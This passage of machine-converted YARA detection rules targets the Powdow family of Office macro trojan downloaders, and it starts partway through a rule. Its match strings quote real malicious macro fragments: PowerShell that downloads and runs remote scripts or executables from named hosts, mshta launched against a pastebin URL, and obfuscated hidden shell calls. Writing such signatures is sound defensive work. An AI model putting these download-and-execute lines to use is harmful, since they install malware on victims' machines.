        $x_2_3 = "ttp://rebrand.ly/WdBPApoMACRO','a.bat')" ascii //weight: 2
        $x_2_4 = "ttp://tinyurl.com/y5onncnm" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://www\" + \".b\" + \"i\" + \"t\" + \"l\" + \"y\" + \".\" + \"c\" + \"o\" + \"m\" + \"/\" + \"dhgjksahdsa\" + \"twieqbdhss" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "http://%8234%8234@j.mp/ddkjaspoqwiokaslkdkw" ascii //weight: 3
        $x_1_2 = "Shell decrypt(\"votm\", \"6\")" ascii //weight: 1
        $x_1_3 = "myChrysler = decrypt(\"r\", \"5\") +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell.exe -Command IEX (New-Object('Net.WebClient')).'DoWnloAdsTrInG'('ht'+'tp://rota-r.ru/wp-admin/css/d')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_10
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {74 70 3a 2f 2f [0-45] 25 [0-45] 40 6a 2e 6d 70 2f 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Sub Auto_close()" ascii //weight: 1
        $x_1_3 = " = \"hta\"\" ht\"" ascii //weight: 1
        $x_1_4 = " = \"\"\"ms\"" ascii //weight: 1
        $x_1_5 = {4d 73 67 42 6f 78 20 28 22 4f 66 66 69 63 65 20 33 36 35 20 [0-15] 22 29 3a 20 53 68 65 6c 6c 20 28 22 57 49 4e 57 4f 52 44 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_11
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = "tp://1230912489%1230192309@j.mp/" ascii //weight: 5
        $x_1_2 = "asdoaksdosasdkdkodk" ascii //weight: 1
        $x_1_3 = "MsgBox (\"Office 365 Not installed!\"): Shell (\"WINWORD\")" ascii //weight: 1
        $x_1_4 = {50 44 66 5f 33 [0-15] 20 3d 20 22 6a 61 73}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_12
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 28 [0-7] 4d 5f 53 4f 69 4d 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= \"hta\"" ascii //weight: 1
        $x_2_3 = "= \"tps://www.rivieradesaolou.com.br/" ascii //weight: 2
        $x_2_4 = "= \"tps://www.diamantesviagens.com.br/" ascii //weight: 2
        $x_1_5 = "= \"\"\"ms" ascii //weight: 1
        $x_1_6 = "= \"hta\"\" ht\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 4 of ($x_1_*))) or
            ((2 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_13
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "com = \"https://pastebin.com/raw/qmgVia1Z" ascii //weight: 1
        $x_1_2 = "Resultado = WinExec(\"cmd.exe /c mshta.exe \" & com, 0)" ascii //weight: 1
        $x_1_3 = "UserForm1.WebBrowser1.Navigate (\"about:blank\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_14
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://1230948%1230948%1230948%1230948@j.mp/vbdjsagdjgasgcvadfgsadghan" ascii //weight: 1
        $x_1_2 = "MsgBox (\"Error!\"): Shell (\"ping.exe\"): Shell (WINWORD +" ascii //weight: 1
        $x_1_3 = "= decrypt(\"n\", \"6\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_15
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "X`E`I |'' nioj- mj$;}) )61,_$(61tniot:: ]trevnoc[(]rahc[ { hcaErof | )'%' (tilpS.srahCiics a$=mj$;'92%72%37" ascii //weight: 1
        $x_1_2 = "hCiicsa$ neddih" ascii //weight: 1
        $x_1_3 = "elytSwodniW" ascii //weight: 1
        $x_1_4 = "lehsrewo" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_16
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "tp://1230948%1230948@j.mp" ascii //weight: 5
        $x_1_2 = "23bbsdajs821" ascii //weight: 1
        $x_1_3 = "MsgBox (\"Office 365 Not installed!\"): Shell (\"WINWORD\")" ascii //weight: 1
        $x_1_4 = "MsgBox (\"Office 365 No Installation\"): Shell (\"WINWORD +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_17
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "$TempDir;(New-Object System.Net.WebClient)" ascii //weight: 1
        $x_1_2 = ".DownloadFile('https://bitbucket.org/seveca-emilia/onemoreslave/downloads/sz.exe'," ascii //weight: 1
        $x_1_3 = "$TempDir+'test.exe');Start-Process 'test.exe'" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_18
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 65 62 75 67 2e 50 72 69 6e 74 20 4d 73 67 42 6f 78 28 22 45 52 52 4f 52 21 52 65 2d 49 6e 73 74 61 6c 6c 20 4f 66 66 69 63 65 22 2c 20 76 62 4f 4b 43 61 6e 63 65 6c 29 3b 20 72 65 74 75 72 6e 73 3b 20 31 [0-3] 6f 62 6a 2e 6c 6f 6c [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {44 65 62 75 67 2e 41 73 73 65 72 74 20 28 56 42 41 2e 53 68 65 6c 6c 28 6c 6f 6c 29 29 [0-3] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {46 75 6e 63 74 69 6f 6e 20 6c 6f 6c 28 29 [0-3] 6c 6f 6c 20 3d 20 [0-22] 2e [0-22] 2e 54 61 67}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_19
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 30 2c 20 22 6f 70 65 6e 22 2c 20 22 65 78 70 6c 6f 72 65 72 22 2c 20 [0-21] 2c 20 22 22 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 28 [0-21] 2c 20 22 2e 63 6d 7a 22 2c 20 22 2e 63 6d 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "& \" -w hi s^leep -Se 31;Start-BitsTr^ansfer -Source htt`p://jklairesolutions.com/za-admin/mannger/today.e`xe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_20
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateProcessA(0&, Chr(112) + \"ower\" + \"shell.exe \" + Chr(150) + \"WindowStyle Hidden\" + \"  IEX (New-Object Net.WebClient).DownloadString('https://filebin.net/ebcszbdnuj5mwwfw/book.ps1')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_21
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set GHDsyriRJdRC = VBA.CreateObject(bsDKCqaXnUJXtE(Array(79,159,(18 + (24 - 5))" ascii //weight: 1
        $x_1_2 = ".Run(snwjmNfFDlsLC.ReadLine, xQhPoMugZkDsmgr, ivVyziFWvSXX)" ascii //weight: 1
        $x_1_3 = "& Chr(XRizSHiQCuqtzSm(i) Xor IpmaGjZDRTTK(i))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_22
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "jldokegbpuq (qpme)" ascii //weight: 1
        $x_1_2 = {69 62 65 6a 76 75 20 3d 20 22 57 53 43 72 69 70 74 2e 73 68 65 6c 6c 22 [0-3] 53 65 74 20 61 76 63 6a 79 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 69 62 65 6a 76 75 29}  //weight: 1, accuracy: Low
        $x_1_3 = "hgibaygbpeawko = avcjy.Run(ylfukdegnsfsv, pwiimf)" ascii //weight: 1
        $x_1_4 = "MsgBox \"Time to take a break!" ascii //weight: 1
        $x_1_5 = "sdfcs = Chr(styuiuty - 111)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_23
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 74 72 55 52 4c 20 3d 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e [0-48] 2e 63 6f 6d 2f (66 69 6c|70 72 6f 6a 65 63) 2f 65 6e 71 75 69 72 79 2e 7a 69 70}  //weight: 1, accuracy: Low
        $x_1_2 = "strRoboappPath = \"C:\\Users\\\" & Environ(\"UserName\") & \"\\Documents\\\" & CurrencyToken 'Your path here" ascii //weight: 1
        $x_1_3 = "varProc = Shell(strRoboappPath, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_24
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Ne = \"ZZZZZZZZZZZZZZZZZZZZZZZZZZZZ" ascii //weight: 1
        $x_1_2 = "oShell.Run \"cscript.exe %appdata%\\www.txt" ascii //weight: 1
        $x_1_3 = "Call CreateFile" ascii //weight: 1
        $x_1_4 = "RO = Environ(\"USERPROFILE\") & \"\\AppData\\Roaming\\\"" ascii //weight: 1
        $x_1_5 = "fso.MoveFile RO + ss, ROI" ascii //weight: 1
        $x_1_6 = "ROI = RO + \"www.ps1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_25
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set objWshShell = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "objWshShell.Popup" ascii //weight: 1
        $x_1_3 = "SpecialPath = objWshShell.SpecialFolders(\"Templates\")" ascii //weight: 1
        $x_1_4 = "prqhhqrabc = \"fadzjgdilazu" ascii //weight: 1
        $x_1_5 = "m974e3e334b64ac13b6dec997fbabf21f = \"naiveremove" ascii //weight: 1
        $x_1_6 = "Sub Document_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_26
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 53 61 76 65 [0-3] 62 61 74 63 68 20 3d 20 22 58 76 75 74 76 64 77 77 77 68 75 66 6f 6a 62 74 6d 65 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Print #1, \"start /MIN C:\\Windo\" + \"ws\\SysWOW64\\\" + call1 + \" -win 1 -enc \" + enc" ascii //weight: 1
        $x_1_3 = {69 20 3d 20 53 68 65 6c 6c 28 62 61 74 63 68 2c 20 30 29 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = "call1 = \"WindowsPo\" + \"werShell\\v1.0\\pow\" + \"ershell.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_27
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set coll = FilenamesCollection(folder$, \"*.xls*\")" ascii //weight: 1
        $x_1_2 = "If fh2oe8wdshf <> \"fqaw\" Then fh2oe8wdshf = fh2oe8wdshf + \":\\pro\" + d8i7wtiuakisjgh + \"gramd" ascii //weight: 1
        $x_1_3 = "fh2oe8wdshf = fh2oe8wdshf + \"ata\\sdfhiuwu.b\"" ascii //weight: 1
        $x_1_4 = {53 68 65 6c 6c 20 66 68 32 6f 65 38 77 64 73 68 66 20 2b 20 22 61 74 22 2c 20 30 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_28
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "s = s + \"start /MIN C:\\Windo" ascii //weight: 1
        $x_1_2 = "s = s + \"ws\\System32\\\" + \"Wind\" + \"owsPo\" + \"werShe\" + \"ll\\v1.0\\pow\" + \"ersh\" + \"ell.exe" ascii //weight: 1
        $x_1_3 = "s = s + \" -win \" + \"1 -enc" ascii //weight: 1
        $x_1_4 = {41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 53 61 76 65 [0-3] 62 61 74 63 68 20 3d 20 22 [0-32] 2e 62 61 74 22 [0-3] 4f 70 65 6e 20 62 61 74 63 68 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31}  //weight: 1, accuracy: Low
        $x_1_5 = "i = Shell(batch, 0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_29
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 65 62 75 67 2e 41 73 73 65 72 74 20 28 56 42 41 2e 53 68 65 6c 6c 28 22 63 3a 5c 77 69 6e 64 6f 77 73 5c 73 79 73 74 65 6d 33 32 5c 63 61 6c 63 5c 2e 2e 5c 63 6f 6e 68 6f 73 74 2e 65 78 65 20 63 3a 5c 77 69 6e 64 6f 77 73 5c 73 79 73 74 65 6d 33 32 5c 63 61 6c 63 5c 2e 2e 5c 63 6f 6e 68 6f 73 74 2e 65 78 65 20 6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 77 77 77 2e 6a 2e 6d 70 2f 61 73 6b 73 [0-37] 22 29 29 [0-3] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {44 65 62 75 67 2e 50 72 69 6e 74 20 4d 73 67 42 6f 78 28 22 45 52 52 4f 52 21 52 65 2d 49 6e 73 74 61 6c 6c 20 4f 66 66 69 63 65 22 2c 20 76 62 4f 4b 43 61 6e 63 65 6c 29 3b 20 72 65 74 75 72 6e 73 3b 20 31 [0-3] 6f 62 6a 2e 6c 6f 6c [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_30
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".DownloadFile('https://j.top4top.io/p_1641i4x6l1.jpg','%public%\\Client.vbs');Start-Process '%public%\\Client.vbs" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c 20 45 6e 76 69 72 6f 6e 24 28 22 43 4f 4d 53 50 45 43 22 29 20 26 20 22 20 2f 63 20 22 20 26 20 [0-15] 2c 20 76 62 48 69 64 65}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 70 73 3a 2f 2f 64 2e 74 6f 70 34 74 6f 70 2e 69 6f 2f 70 5f 31 36 34 32 35 70 71 76 36 31 2e 6a 70 67 27 2c 27 [0-64] 2e 76 62 73 27 29 3b 53 74 61 72 74 2d 50 72 6f 63 65 73 73}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_31
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "LResult = Replace(enc, \"_\", \"\")" ascii //weight: 1
        $x_1_2 = "call1 = \"WindowsPo\" + \"werShell\\v1.0\\pow\" + \"ershell.exe" ascii //weight: 1
        $x_1_3 = {41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 53 61 76 65 [0-3] 62 61 74 63 68 20 3d 20 22 50 64 71 6d 70 72 70 71 6b 65 77 7a 6c 75 75 7a 63 75 6a 78 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_4 = "Print #1, \"start /MIN C:\\Windo\" + \"ws\\SysWOW64\\\" + call1 + \" -win 1 -enc \" + LResult" ascii //weight: 1
        $x_1_5 = "i = Shell(batch, 0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_32
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "lodhi = \"m\" + \"S\" + \"H\" + \"t\" + \"A\"" ascii //weight: 1
        $x_1_2 = {4d 73 67 42 6f 78 20 22 4c 6f 61 64 69 6e 67 [0-7] 22 3a 20 53 68 65 6c 6c 20 6c 6f 64 68 69 20 2b 20 22 20 68 74 74 70 3a 2f 2f 31 32 33 38 34 39 32 38 31 39 38 33 39 31 38 32 33 25 31 32 33 38 34 39 32 38 31 39 38 33 39 31 38 32 33 40 6a 2e 6d 70 2f 22 20 2b 20 22 66 76 67 6a 61 64 61 67 6a 22 20 2b 20 22 64 62 67 76 61 68 73 6b 73 61 64 67 6b 61 22 3a 20 53 68 65 6c 6c 20 22}  //weight: 1, accuracy: Low
        $x_1_3 = "ExcelFile = (ActivePresentation.Path & \"\\test.xlsx\")" ascii //weight: 1
        $x_1_4 = "Set exl = CreateObject(\"Excel.Application\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

